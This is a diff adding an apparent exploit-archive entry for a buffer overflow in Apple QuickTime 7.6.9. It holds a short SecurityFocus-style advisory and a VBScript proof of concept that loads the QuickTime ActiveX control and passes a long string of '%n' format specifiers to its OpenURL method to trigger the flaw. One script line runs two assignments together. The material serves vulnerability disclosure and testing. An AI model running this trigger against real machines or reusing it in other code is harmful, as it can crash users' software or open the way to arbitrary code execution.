@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/49465/info
+
+Apple QuickTime is prone to a buffer-overflow vulnerability because of a failure to properly bounds-check user-supplied data.
+
+Successful exploits will allow attackers to execute arbitrary code in the context of the currently logged-in user; failed exploit attempts may cause denial-of-service conditions.
+
+QuickTime 7.6.9 is vulnerable; other versions may also be affected. 
+
+<?XML version='1.0' standalone='yes' ?>
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:0F5B08E7-94EE-470B-A184-5CD4A7DF35A3' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Program Files\QuickTime\QuickTimePlayer.dll"
+prototype  = "Sub OpenURL ( ByVal url As String )"
+memberName = "OpenURL"progid     = "QuickTimePlayerLib.QuickTimePlayer"
+argCount   = 1
+arg1="%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n"
+target.OpenURL arg1
+</script>
+</job>
+</package>
